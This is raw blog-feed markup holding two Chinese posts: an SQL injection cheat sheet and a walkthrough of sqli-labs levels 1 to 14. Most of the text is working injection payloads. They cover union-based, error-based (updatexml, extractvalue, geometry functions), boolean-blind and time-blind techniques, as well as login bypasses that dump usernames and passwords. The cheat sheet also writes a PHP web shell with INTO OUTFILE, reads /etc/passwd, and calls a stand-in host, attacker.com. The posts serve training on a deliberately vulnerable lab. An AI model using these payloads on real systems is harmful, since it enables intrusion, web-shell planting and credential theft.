<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET/POST/PUT/DELETE参数：常见的注入点，通常会尝试在HTTP请求的参数中注入SQL命令。</span><br><span class="line">如：http://xx.com/product.php?id=12&#x27; OR 1=1 --</span><br><span class="line">X-Forwarded-For：HTTP头部字段，通常用于伪造IP地址，但也可以用于注入SQL或XSS。</span><br><span class="line">如：X-Forwarded-For: 192.168.1.1&#x27; OR 1=1 --</span><br><span class="line">文件名：尝试通过文件上传或者文件路径访问时进行注入。</span><br></pre></td></tr></table></figure>

<p><strong>判断注入点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如：http://xx.com/product.php?id=12/(在这里添加判断)</span><br><span class="line"></span><br><span class="line">&#x27;：单引号，常见于字符串插入的地方，尤其是SQL注入。</span><br><span class="line">/：斜杠，可能用于路径遍历、注入等。</span><br><span class="line">&quot;：双引号，常用于字符串拼接。</span><br><span class="line">1/1：常用于测试SQL注入的效果，1/1返回真。</span><br><span class="line">1/0：常用于测试除零错误，触发数据库报错。</span><br><span class="line">and 1=1：常见的SQL注入测试条件，通常返回真，确认注入是否成功。</span><br><span class="line">&quot; and &quot;1&quot;=&quot;1：类似于</span><br><span class="line">and 1=1，用于测试注入成功与否。</span><br><span class="line">and 1=2：尝试返回假的条件（例如，1=2为假），验证是否会导致不同的行为。</span><br><span class="line">or 1=1：另一种常用的条件判断，若数据库返回成功则说明注入可行。</span><br><span class="line">or 1=：同样是一个条件，可能会触发SQL查询错误。</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1：注入测试，验证条件是否返回真。</span><br><span class="line">+：加号可能用于URL编码或者SQL中拼接字符串。</span><br><span class="line">-：减号，用于注释掉SQL中的后续部分。</span><br><span class="line">^：异或运算符，有时用于绕过过滤或触发错误。</span><br><span class="line">*：星号，可能用于选择所有字段，或作为乘法运算符。</span><br><span class="line">%：百分号，可能用于SQL模糊匹配或URL编码。</span><br><span class="line">/：除号，常用来触发除零错误等SQL注入。</span><br><span class="line">&lt;&lt;, &gt;&gt;：左移右移位操作符，可能用于绕过过滤或触发错误。</span><br><span class="line">||：逻辑或操作符，用于组合多个条件。</span><br><span class="line">|：按位或操作符，可能用于SQL注入或绕过过滤。</span><br><span class="line">&amp;：按位与操作符，常用于某些SQL注入攻击。</span><br><span class="line">&amp;&amp;：逻辑与操作符，组合条件判断。</span><br><span class="line">~：按位取反操作符，有时用于SQL注入。</span><br><span class="line">!：逻辑非操作符，常用于条件判断。</span><br><span class="line">@：在某些数据库中用作变量前缀，或用于其他目的。</span><br></pre></td></tr></table></figure>

<p><strong>注入分类</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">经典SQL注入：在输入字段中注入恶意的SQL查询语句，例如：&#x27; OR 1=1 --，绕过身份验证，返回所有记录。</span><br><span class="line">盲注（Blind SQL Injection）：</span><br><span class="line">布尔盲注：通过观察页面响应是否变化来推测数据库的内容，例如：&#x27; AND 1=1 -- 和 &#x27; AND 1=2 --。</span><br><span class="line">时间盲注：通过观察数据库响应延迟来判断查询的真假，例如：&#x27; AND SLEEP(5) --。</span><br><span class="line">联合查询注入（Union-based SQL Injection）：使用UNION SELECT来合并多个查询，尝试获取数据库中的其他表数据。</span><br><span class="line">报错注入（Error-based SQL Injection）：通过生成SQL错误，泄露数据库结构信息。</span><br></pre></td></tr></table></figure>

<p><strong>Mysql 中常用的函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version():查询数据库的版本</span><br><span class="line">user():查询数据库的使用者</span><br><span class="line">database():数据库</span><br><span class="line">system_user():系统用户名</span><br><span class="line">session_user():连接数据库的用户名</span><br><span class="line">current_user():当前用户名</span><br><span class="line">load_file():读取本地文件</span><br><span class="line">@@datadir:读取数据库路径</span><br><span class="line">@@basedir:mysql安装路径</span><br><span class="line">@@version_complie_os:查看操作系统</span><br><span class="line">@@version：SQL查询常见的数据库版本信息。</span><br><span class="line">@@servername：SQL查询数据库服务器名称。</span><br><span class="line">@@language：SQL查询当前数据库语言设置。</span><br><span class="line">@@spid：SQL查询当前会话ID（进程ID）。</span><br></pre></td></tr></table></figure>

<p><strong>测试列数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如 </span><br><span class="line">http://xx.com/index.asp?id=12+union+select+null,null-- ，不断增加 </span><br><span class="line">null 至不返回</span><br></pre></td></tr></table></figure>

<p><strong>报错注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and select 1/0：用来触发除零错误，从而可以获取数据库错误信息，帮助推测数据库类型。</span><br><span class="line">http://xx.com/product.php?id=12 and *select 1 from (select count(*), concat(version(), floor(rand(0)2))x from information_schema.tables group by x)a：通过查询数据库信息并触发错误来暴露数据库版本信息。</span><br><span class="line">http://xx.com/product.php?id=12 and extractvalue(1, concat(0x5c, (select user())))：利用XML函数extractvalue来注入并获取数据库用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and updatexml(0x3a, concat(1, (select user())), 1)：类似于extractvalue，用于从XML中提取数据。</span><br><span class="line">http://xx.com/product.php?id=12 and exp(~(SELECT * from(select user())a))：通过调用exp函数触发错误并获取数据库用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and ST_LatFromGeoHash((select * from(select * from(select user())a)b))：利用空间数据函数进行注入。</span><br></pre></td></tr></table></figure>

<p><strong>基于geometric的报错注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and GeometryCollection((select * from(select * from(select user())a)b))：触发错误信息并通过几何类型函数获取用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and polygon((select * from(select * from(select user())a)b))：同样触发错误，通过polygon函数。</span><br><span class="line">http://xx.com/product.php?id=12 and multipoint((select * from(select * from(select user())a)b))：几何类型函数的一种。</span><br><span class="line">http://xx.com/product.php?id=12 and multilinestring((select * from(select * from(select user())a)b))：几何类型函数，用于注入。</span><br><span class="line">http://xx.com/product.php?id=12 and LINESTRING((select * from(select * from(select user())a)b))：几何类型函数之一，用于注入。</span><br><span class="line">http://xx.com/product.php?id=12 and multipolygon((select * from(select * from(select user())a)b))：几何类型函数，用于注入。</span><br></pre></td></tr></table></figure>

<p>其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效而以上列表中基于geometric的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效</p>
<p><strong>堆叠注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and ;select 1：使用分号（;）来结束当前查询并开始新的查询。</span><br></pre></td></tr></table></figure>

<p><strong>注释符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如：http://xx.com/product.php?id=12#</span><br><span class="line">#：注释符，SQL中用来注释掉后续的语句。</span><br><span class="line">--+：SQL注释符，</span><br><span class="line">--用于注释，</span><br><span class="line">+可绕过某些过滤器。</span><br><span class="line">/xxx/：块注释，SQL注释的一种形式。</span><br><span class="line">/!xxx/：条件注释，仅在特定版本的MySQL中生效，通常用于版本差异化操作。</span><br><span class="line">/!50000xxx/：MySQL特定版本支持的注释格式，通常用于绕过过滤。</span><br></pre></td></tr></table></figure>

<p><strong>判断过滤规则</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是否有trunc：检查是否存在截断字符。</span><br><span class="line">是否过滤某个字符：检查是否有过滤掉特定字符，如单引号、双引号等。</span><br><span class="line">是否过滤关键字：检查是否有过滤掉SQL关键字，如select, union, insert等。</span><br><span class="line">slash和编码：检查是否需要对斜杠或字符进行编码或转义。</span><br></pre></td></tr></table></figure>

<p><strong>获取信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断数据库类型</span><br><span class="line">and exists(select * from msysobjects) &gt; 0：针对Access数据库。</span><br><span class="line">and exists(select * from sysobjects) &gt; 0：针对SQL Server数据库。</span><br><span class="line">判断数据库表</span><br><span class="line">and exists (select * from admin)：检查是否存在admin表，用来验证表名。</span><br><span class="line">确定字段数</span><br><span class="line">Order By：常用于通过排序获取不同字段数目，帮助注入者确认表的列数。</span><br></pre></td></tr></table></figure>

<p><strong>测试权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读敏感文件：测试是否能够读取敏感文件，如/etc/passwd（类Unix系统）、Windows系统中的boot.ini等。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT load_file(&#x27;/etc/passwd&#x27;) --</span><br><span class="line"></span><br><span class="line">写shell：测试是否能够上传并执行恶意脚本（shell）。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/shell.php&#x27; --</span><br><span class="line"></span><br><span class="line">文件操作：测试是否能够对文件进行修改或删除操作。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT &quot;&lt;?php echo &#x27;Hello&#x27;; ?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/hello.php&#x27; --</span><br></pre></td></tr></table></figure>

<p><strong>网络请求</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">带外通道：使用HTTP请求、DNS请求、SMTP等协议发送数据，从而建立与攻击者的通信通道。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT load_file(&#x27;http://attacker.com/shell.txt&#x27;) --</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>WEB漏洞挖掘笔记</category>
      </categories>
      <tags>
        <tag>SQL注入篇</tag>
      </tags>
  </entry>
  <entry>
    <title>本地靶场 - sqli-labs通关秘籍</title>
    <url>/cnblogs.github.io/2025/01/04/hacker/local/range/sqli-labs/sqli-labs%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/</url>
    <content><![CDATA[<h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a><strong>Less-1</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断sql语句是否是拼接，且是字符型还是数字型。</span><br><span class="line">?id=1  正确</span><br><span class="line">?id=1&#x27; 错误</span><br><span class="line"></span><br><span class="line">?id=1&#x27;--+</span><br><span class="line">?id=1&#x27;order by 3 --+</span><br><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>

<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a><strong>Less-2</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by 3</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br></pre></td></tr></table></figure>

<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a><strong>Less-3</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在输入?id=2&#x27;的时候看到页面报错信息。可推断sql语句是单引号字符型且有括号，所以我们需要闭合单引号且也要考虑括号</span><br><span class="line">?id=2&#x27;)--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27;) order by 3--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>

<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a><strong>Less-4</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">页面报错信息得知sql语句是双引号字符型且有括号，通过以下代码进行sql注入</span><br><span class="line">?id=1&quot;)--+</span><br><span class="line"></span><br><span class="line">?id=1&quot;) order by 3--+</span><br><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>

<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a><strong>Less-5</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前数据库名称</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line">获取当前数据库所有表名称</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">获取当前数据库user表所有列名称</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">#获取当前数据库user表所有username和password的值</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),32,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),63,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),94,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),125,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),156,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),187,31),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-6</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第六关和第五关是差不多的，根据页面报错信息可以猜测id参数是双引号，只需将第五关的单引号换成双引号就可以了。</span><br><span class="line"></span><br><span class="line">获取当前数据库名称</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line">获取当前数据库所有表名称</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">获取当前数据库user表所有列名称</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">#获取当前数据库user表所有username和password的值</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),32,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),63,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),94,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),125,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),156,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),187,31),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a><strong>Less-7</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) --+</span><br><span class="line">?id=1&#x27;)) order by 3 --+</span><br><span class="line"></span><br><span class="line">SELECT column1 FROM table_name INTO OUTFILE &#x27;file_path&#x27;</span><br><span class="line">OUTFILE命令可以将查询结果导出为文本文件,CSV文件等多种格式。</span><br><span class="line">注意：使用这个功能需要提前开启权限。你可以前往MySQL的源文件目录中，</span><br><span class="line">	打开my.ini配置文件，并修改其中的`secure_file_priv=&#x27;D://&#x27;`</span><br><span class="line">	参数设置为你的安全目录。(请设置为C盘以外的磁盘，避免系统权限问题。)</span><br><span class="line">	修改完成并重启后在MySQL命令行中输入`show variables like &#x27;%secure%&#x27;;`查看是否设置成功。</span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) union select database(),version(),user() from dual into outfile &quot;d:\\project\\sqli-labs-master\\Less-7\\1.txt&quot; --+ </span><br><span class="line"></span><br><span class="line">执行完后，访问地址：</span><br><span class="line">http://192.168.120.139:30003/Less-7/1.txt</span><br></pre></td></tr></table></figure>

<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a><strong>Less-8</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">布尔盲注</span><br><span class="line">database()	  显示数据库名称</span><br><span class="line">left(a,b)	  从左侧截取a的前b位</span><br><span class="line">substr(a,b,c) 从b位置开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)    从位置b开始，截取a字符串的c位</span><br><span class="line">length()      返回字符串的长度</span><br><span class="line">Ascii()       将某个字符转换为ascii值</span><br><span class="line">char()        将ASCII码转换为对应的字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查数据库版本</span><br><span class="line">?id=1&#x27; and left(version(),1)=5 %23</span><br><span class="line">猜解数据库的长度</span><br><span class="line">?id=1&#x27; and length(database())=8 %23</span><br><span class="line">猜数据库名字</span><br><span class="line">?id=1&#x27;and left(database(),1)&gt;&#x27;a&#x27;--+</span><br><span class="line">?id=1&#x27;and left(database(),2)&gt;&#x27;sa&#x27;--+</span><br><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;80--+</span><br><span class="line">猜解表名</span><br><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+</span><br><span class="line">猜解字段名</span><br><span class="line">?id=1&#x27; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),y)=&quot;&quot;--+</span><br><span class="line">猜用户名</span><br><span class="line">?id=1&#x27; and left((select username from users limit x,1),y)=&quot;&quot;--+</span><br><span class="line">猜密码</span><br><span class="line">?id=1&#x27; and left((select password from users limit x,1),y)=&quot;&quot;--+</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/Cancerking/hacker-tools/tree/main/python/local/range/sqli-lab/Less-8.py">【实操脚本地址 Less-8.py】</a></p>
<h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a><strong>Less-9</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本关是基于时间的盲注</span><br><span class="line">1、sleep(5)：延时5秒</span><br><span class="line">2、if(a,b,c)：a为条件，正确返回b，否则返回c</span><br><span class="line">   如果正确5秒后返回，错误则立即返回</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if(1=1,sleep(5),1)--+</span><br><span class="line">判断参数构造。</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;9,sleep(5),1)--+</span><br><span class="line">判断数据库名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/Cancerking/hacker-tools/tree/main/python/local/range/sqli-lab/Less-9.py">【实操脚本地址 Less-9.py】</a></p>
<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a><strong>Less-10</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本关和第九关一样，只需要将单引号换成双引号。同样是基于时间的盲注</span><br><span class="line">1、sleep(5)：延时5秒</span><br><span class="line">2、if(a,b,c)：a为条件，正确返回b，否则返回c</span><br><span class="line">   如果正确5秒后返回，错误则立即返回</span><br><span class="line"></span><br><span class="line">?id=1&quot; and if(1=1,sleep(5),1)--+</span><br><span class="line">判断参数构造。</span><br><span class="line">?id=1&quot;and if(length((select database()))&gt;9,sleep(5),1)--+</span><br><span class="line">判断数据库名长度</span><br><span class="line">?id=1&quot;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br><span class="line">?id=1&quot;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">判断所有表名长度</span><br><span class="line">?id=1&quot;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br><span class="line">?id=1&quot;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&quot;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line">?id=1&quot; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&quot; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/Cancerking/hacker-tools/tree/main/python/local/range/sqli-lab/Less-10.py">【实操脚本地址 Less-10.py】</a></p>
<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a><strong>Less-11</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试使用万能登录  </span><br><span class="line">uname=1&#x27; or 1=1#</span><br><span class="line"></span><br><span class="line">uname=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;passwd=1&#x27; union select 1,2#&amp;submit=Submit</span><br><span class="line">uname=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;passwd=1&#x27; union select database(),user()#&amp;submit=Submit</span><br><span class="line">uname=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;passwd=1&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),2#&amp;submit=Submit</span><br><span class="line">uname=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;passwd=1&#x27;union select (select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;),2#&amp;submit=Submit</span><br><span class="line">uname=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;passwd=1&#x27;union select group_concat(username),group_concat(password) from security.users#&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a><strong>Less-12</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;&amp;passwd=admin&amp;submit=Submit #页面不报错</span><br><span class="line">uname=admin&quot;&amp;passwd=admin&amp;submit=Submit #页面有错误显示</span><br><span class="line"></span><br><span class="line">uname=a&quot;) union select 1,database()# &amp;passwd=admin&amp;submit=Submit</span><br><span class="line">uname=a&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)# &amp;passwd=admin&amp;submit=Submit</span><br><span class="line">uname=a&quot;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)# &amp;passwd=admin&amp;submit=Submit</span><br><span class="line">uname=a&quot;) union select 1,(select group_concat(username,password) from security.users)# &amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h4 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a><strong>Less-13</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) union select 1,2 #</span><br><span class="line"></span><br><span class="line">0x7e是~的意思，用concat拼接我们的sql语句，不符合xml文档的格式，就会报错</span><br><span class="line">1&#x27;)and updatexml(1,concat(0x7e,(select database())),3)#</span><br><span class="line">1&#x27;)and extractvalue(1,concat(0x7e,(select database())))#</span><br><span class="line">最大只能显示32个字符，所以要配合limit进行使用，每次只能显示一个表名，limt0,1,limt1,1,limit2,1...</span><br><span class="line">1&#x27;)and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))#</span><br><span class="line"> 爆列 </span><br><span class="line">1&#x27;)and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() limit 0,1)))#</span><br><span class="line">爆用户名密码 </span><br><span class="line">1&#x27;)and extractvalue(1,concat(0x7e,(select username from users limit 0,1)))#</span><br><span class="line">1&#x27;)and updatexml(1,concat(0x7e,(select username from users limit 0,1)),3)#</span><br></pre></td></tr></table></figure>

<h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a><strong>Less-14</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;&amp;passwd=111&amp;submit=submit 回显正常</span><br><span class="line">uname=admin&quot;&amp;passwd=111&amp;submit=submit 回显报错</span><br><span class="line">uname=admin&quot;#&amp;passwd=111&amp;submit=submit 回显正常</span><br><span class="line"></span><br><span class="line">uname=admin&quot; order by 3#&amp;passwd=111&amp;submit=submit</span><br><span class="line">uname=admin&quot; order by 2#&amp;passwd=111&amp;submit=submit</span><br><span class="line">uname=admin&quot; union select 1,2#&amp;passwd=111&amp;submit=submit</span><br><span class="line"></span><br><span class="line">查表</span><br><span class="line">uname=admin&quot; union select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a#&amp;passwd=111&amp;submit=submit</span><br><span class="line">查列</span><br><span class="line">uname=admin&quot; union select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),floor(rand()*2))a from information_schema.tables group by a#&amp;passwd=111&amp;submit=submit</span><br><span class="line">查数据</span><br><span class="line">uname=admin&quot; union select count(*),concat((select username from users limit 0,1),floor(rand()*2))a from information_schema.tables group by a#&amp;passwd=111&amp;submit=submit</span><br></pre></td></tr></table></figure>

